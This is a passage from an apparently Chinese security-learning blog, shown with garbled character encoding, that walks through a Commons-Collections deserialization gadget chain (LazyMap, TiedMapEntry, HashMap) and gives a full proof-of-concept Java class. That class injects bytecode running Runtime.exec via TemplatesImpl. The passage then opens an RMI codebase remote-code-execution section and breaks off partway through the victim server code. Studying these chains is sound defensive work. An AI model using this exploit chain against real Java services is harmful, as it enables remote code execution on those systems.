<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">Object</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">super</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Object</span> value <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>factory<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿™é‡Œæ‰§è¡Œäº†transformæ–¹æ³•</span>
        <span class="token keyword">super</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> value<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¦‚æœthis.factoryä¸ºinvokerTransformerï¼Œåˆ™å½“LazyMap#getè¢«è°ƒç”¨çš„æ—¶å€™ï¼Œå‘½ä»¤å¯ä»¥æ‰§è¡Œã€‚</p>
<p>æ‰€ä»¥éœ€è¦æ„é€ LazyMap</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102162535035.png" alt="image-20220102162535035" loading="lazy"></p>
<p>å¯ä»¥ç›´æ¥é€šè¿‡decorateæ–¹æ³•æ¥æ„é€ ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Map</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> invokerTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h4><p>ç°åœ¨éœ€è¦æ‰¾åˆ°ä¸€ä¸ªClassèƒ½å¤Ÿè°ƒç”¨LazyMap#get()æ–¹æ³•ï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†<strong>TiedMapEntry</strong></p>
<p>åœ¨TiedMapEntry#get()å¤„è°ƒç”¨äº†getValue()æ–¹æ³•</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>åŒæ—¶hashCodeæ–¹æ³•è°ƒç”¨äº†getValue()æ–¹æ³•</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">Object</span> value <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>value <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> value<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>è¿™æ ·å†™ï¼š</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h4 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h4><p>ä¸ºäº†è°ƒç”¨TiedMapEntry#hashCodeæ–¹æ³•ï¼Œå¯ä»¥åˆ©ç”¨HashMapçš„ååºåˆ—åŒ–æ“ä½œã€‚</p>
<p>åœ¨HashMapä¸­ï¼Œå®ƒæœ‰è‡ªå·±çš„<strong>readObject()æ–¹æ³•</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102165724308.png" alt="image-20220102165724308" loading="lazy"></p>
<p>é¦–å…ˆä¼šååºåˆ—åŒ–HashMapä¸­çš„keyå’Œvalue</p>
<p>åœ¨æœ€åä¸€è¡Œï¼Œè°ƒç”¨äº†hash(key)</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token function">hash</span><span class="token punctuation">(</span><span class="token class-name">Object</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> h<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>key <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token punctuation">(</span>h <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>h <span class="token operator">>>></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>hashæ–¹æ³•ä¸­è°ƒç”¨äº†key.hashCode()</p>
<p>å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬å°†ä¹‹å‰çš„tiedMapEntryæ”¾å…¥hashMapçš„keyä¸­ï¼Œå°±èƒ½è§¦å‘æ•´ä¸ªåˆ©ç”¨é“¾äº†ã€‚</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span><span class="token string">"helloWorld"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="æ”¹å†™InvokerTransformer"><a href="#æ”¹å†™InvokerTransformer" class="headerlink" title="æ”¹å†™InvokerTransformer"></a>æ”¹å†™InvokerTransformer</h4><p>è®°å¾—å‰é¢æˆ‘ä»¬åªæ˜¯æ·»åŠ äº†åœ¨InvokerTransformerä¸­æ·»åŠ äº†å ä½ç¬¦å·ï¼Œä¸‹é¢éœ€è¦æ”¹ä¸€ä¸‹:</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">lazyMap<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//éœ€è¦æŠŠlazyMapä¸­æˆ‘ä»¬ä¹‹å‰åŠ å…¥çš„æ²¡ç”¨çš„mapç»™ç§»é™¤</span>
<span class="token class-name">Field</span> iMethodName <span class="token operator">=</span> invokerTransformer<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"iMethodName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
iMethodName<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
iMethodName<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>invokerTransformer<span class="token punctuation">,</span><span class="token string">"newTransformer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="POCæ„é€ -3"><a href="#POCæ„é€ -3" class="headerlink" title="POCæ„é€ "></a>POCæ„é€ </h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> cc11 <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">CannotCompileException</span><span class="token punctuation">,</span> <span class="token class-name">NotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">/*æ„é€ æ¶æ„å­—èŠ‚ç */</span>
        <span class="token class-name">ClassPool</span> classPool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> cc <span class="token operator">=</span> classPool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"Evil"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> cmd <span class="token operator">=</span> <span class="token string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span><span class="token punctuation">;</span>
        cc<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span>
        cc<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"Leihehe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cc<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>classPool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> evilbytes <span class="token operator">=</span> cc<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ¶æ„å­—èŠ‚ç </span>

        <span class="token comment">/*é…ç½®TemplatesImpl - åŠ è½½æ¶æ„classåˆ°jvm*/</span>
        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Field</span> bytecodes <span class="token operator">=</span> templates<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        bytecodes<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        bytecodes<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>evilbytes<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿™é‡Œä¼ å…¥çš„evilbyteséœ€è¦åœ¨byte[][]ä¸­</span>
        <span class="token class-name">Field</span> name <span class="token operator">=</span> templates<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        name<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        name<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"LeiHello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Field</span> tfactory <span class="token operator">=</span> templates<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_tfactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        tfactory<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        tfactory<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//ä»»æ„æ–¹æ³•è°ƒç”¨templates.newTransformer()æˆ–è€…templates.getOutputPropertieså³å¯è§¦å‘</span>

        <span class="token comment">/*æ„é€ invokerTransformeræ¥è°ƒç”¨newTransformer()æ–¹æ³•*/</span>
        <span class="token class-name">InvokerTransformer</span> invokerTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getClass"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Map</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> invokerTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//éœ€è¦æŠŠlazyMapä¸­æˆ‘ä»¬ä¹‹å‰åŠ å…¥çš„æ²¡ç”¨çš„mapç»™ç§»é™¤</span>

        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/*åˆ©ç”¨HashMapååºåˆ—åŒ–ä¸­çš„hash(key)æ–¹æ³•ï¼Œè§¦å‘åˆ©ç”¨é“¾*/</span>
        <span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span><span class="token string">"helloWorld"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        lazyMap<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Field</span> iMethodName <span class="token operator">=</span> invokerTransformer<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"iMethodName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        iMethodName<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        iMethodName<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>invokerTransformer<span class="token punctuation">,</span><span class="token string">"newTransformer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ObjectOutputStream</span> outputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        outputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
        outputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ObjectInputStream</span> inputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        inputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102172023830.png" alt="image-20220102172023830" loading="lazy"></p>
<p>å¦ä¸€ç‰ˆæœ¬çš„POCæˆ‘ä¹Ÿæ”¾åœ¨ä»“åº“**<a target="_blank" rel="noopener" href="https://github.com/leihehehe/Java-deserialization-vulnerability">Java-deserialization-vulnerability</a>**ä¸Šäº†ï¼ˆæµç¨‹æ˜¯ä¸€æ ·çš„ï¼Œä¸è¿‡æ˜¯æå–äº†ä¸€äº›æ–¹æ³•ï¼Œçœ‹èµ·æ¥æ›´ç®€æ´ä¸€äº›ï¼‰</p>
<h2 id="æ€»ç»“-3"><a href="#æ€»ç»“-3" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ç»ˆäºå­¦å®Œäº†ccé“¾ï¼Œæ”¶è·éå¸¸å¤šï¼Œå°¤å…¶æ˜¯å¯¹javaåå°„ã€ä»£ç†å’Œåˆ©ç”¨é“¾çš„æ„é€ æ€è·¯æœ‰äº†æ›´æ·±çš„ç†è§£ã€‚ä¹Ÿéå¸¸æ„Ÿè°¢ç½‘ä¸Šå„ä½å¸ˆå‚…æ— ç§çš„å…±äº«ï¼Œæ‰èƒ½è®©æˆ‘çœ‹åˆ°è¿™ä¹ˆç²¾å½©çš„åˆ†æã€‚</p>
<h1 id="RMIååºåˆ—åŒ–æ¼æ´"><a href="#RMIååºåˆ—åŒ–æ¼æ´" class="headerlink" title="RMIååºåˆ—åŒ–æ¼æ´"></a>RMIååºåˆ—åŒ–æ¼æ´</h1><h2 id="RMIå‰ç½®çŸ¥è¯†"><a href="#RMIå‰ç½®çŸ¥è¯†" class="headerlink" title="RMIå‰ç½®çŸ¥è¯†"></a>RMIå‰ç½®çŸ¥è¯†</h2><p><a target="_blank" rel="noopener" href="https://leihehehe.github.io/2021/07/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJAVA-RMI%E5%8E%9F%E7%90%86%E3%80%81%E6%B5%81%E7%A8%8B-2/">Javaååºåˆ—åŒ–æ¼æ´ä¹‹JAVA RMIåŸç†ã€æµç¨‹(2)</a></p>
<h2 id="Codebaseè¿œç¨‹å‘½ä»¤æ‰§è¡Œ"><a href="#Codebaseè¿œç¨‹å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="Codebaseè¿œç¨‹å‘½ä»¤æ‰§è¡Œ"></a>Codebaseè¿œç¨‹å‘½ä»¤æ‰§è¡Œ</h2><h3 id="å‰è¨€-4"><a href="#å‰è¨€-4" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>åœ¨æœ‰äº›ç¯å¢ƒæ¡ä»¶ä¸‹ï¼Œæˆ‘ä»¬éœ€è¦è¿œç¨‹åŠ è½½ä¸€äº›æœ¬åœ°ä¸å­˜åœ¨çš„ç±»ï¼Œè€Œ<code>codebase</code>ä¾¿æ˜¯ç”¨æ¥å‘Šè¯‰JAVAåº”è¯¥ä»å“ªé‡Œè¿œç¨‹åŠ è½½æœ¬åœ°ä¸å­˜åœ¨çš„ç±»ã€‚</p>
<p>codebaseå¯ä»¥æ˜¯http, ftpè¿™æ ·çš„urlåœ°å€ï¼Œä¾‹å¦‚å½“æˆ‘ä»¬åŠ è½½<strong>example</strong>ç±»æ—¶ï¼ŒJavaå‘ç°æœ¬åœ°å¹¶ä¸å­˜åœ¨è¿™æ ·çš„ç±»ï¼Œå®ƒå°±ä¼šå»codebaseæŒ‡å‘çš„åœ°å€æœç´¢ä¸‹è½½<strong>example</strong>ç±»å¹¶åŠ è½½ã€‚</p>
<p>å¦‚æœcodebaseæ˜¯å¯æ§çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è®©æœåŠ¡å™¨æ¶æ„åŠ è½½æˆ‘ä»¬çš„æ”»å‡»ç±»ï¼ˆè¿™ä¸ªç±»åœ¨æœåŠ¡å™¨ä¸Šå¹¶ä¸å­˜åœ¨ï¼‰ã€‚</p>
<p>Javaå®˜æ–¹è‡ªç„¶æ³¨æ„åˆ°äº†è¿™ä¸€ç‚¹ï¼Œäºæ˜¯é‡‡ç”¨äº†ä¸€äº›å®‰å…¨æªæ–½ï¼Œè®©æˆ‘ä»¬ä¸èƒ½éšæ„è¿œç¨‹åŠ è½½ç±»ï¼Œå¦‚æœæˆ‘ä»¬ä¸€å®šè¦åŠ è½½è¿œç¨‹ç±»ï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p>
<ul>
<li>Serverå®‰è£…å¹¶é…ç½®äº†<strong>SecurityManager</strong></li>
<li>Javaç‰ˆæœ¬ä½äº7u21ã€6u45ï¼Œæˆ–è€…è®¾ç½®äº†<code>java.rmi.server.useCodebaseOnly=false</code><ul>
<li>useCodebaseOnlyå‚æ•°åœ¨7u21ã€6u45ç‰ˆæœ¬ä¹‹åé»˜è®¤è®¾ç½®ä¸º<strong>true</strong>ï¼Œè¡¨ç¤ºJavaè™šæ‹Ÿæœºå°†åªä¿¡ä»»é¢„å…ˆé…ç½®å¥½çš„codebase ï¼Œä¸å†æ”¯æŒä»RMIè¯·æ±‚ä¸­è·å–</li>
</ul>
</li>
</ul>
<p>è¯¥æ¼æ´åˆ©ç”¨æ¡ä»¶è‹›åˆ»ï¼Œå› æ­¤å°‘æœ‰äººå¯¹æ­¤è¿›è¡Œæ·±å…¥ç ”ç©¶ï¼ŒPç¥åœ¨<strong>JAVAå®‰å…¨æ¼«è°ˆ</strong>ä¸­æåˆ°äº†è¯¥æ¼æ´ï¼Œæˆ‘åœ¨å¤ç°çš„æ—¶å€™é‡åˆ°äº†å¾ˆå¤šå‘ï¼Œç½‘ä¸Šçš„å¤§éƒ¨åˆ†èµ„æ–™ç»†èŠ‚éƒ½äº¤ä»£å¾—ä¸æ¸…ä¸æ¥šï¼Œå¾ˆéš¾å¼„æ‡‚ï¼Œå•å•æ˜¯è¿™ä¸ªæ¼æ´å°±èŠ±äº†æˆ‘å¾ˆé•¿æ—¶é—´å»å¤ç°ï¼Œæ­¤æ–‡å°†è¯¦ç»†è®²è§£åŸç†ï¼Œå¸Œæœ›èƒ½å¤Ÿå¸®å¤§å®¶å¼„æ‡‚æ¯ä¸€æ­¥ã€‚</p>
<h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><h4 id="è¢«æ”»å‡»æ–¹"><a href="#è¢«æ”»å‡»æ–¹" class="headerlink" title="è¢«æ”»å‡»æ–¹"></a>è¢«æ”»å‡»æ–¹</h4><p><strong>RemoteRMIServer.java</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">Naming</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RemoteRMIServer</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//è®¾ç½®SecurityManager</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"setup SecurityManager"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">setSecurityManager</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token class-name">Calc</span> h <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Calc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ›å»ºregistry</span>
        <span class="token class-name">Naming</span><span class="token punctuation">.</span><span class="token function">rebind</span><span class="token punctuation">(</span><span class="token string">"refObj"</span><span class="token punctuation">,</span> h<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ç»‘å®šservice Calc</span>
    <span class="token punctuation">&#125;</span>
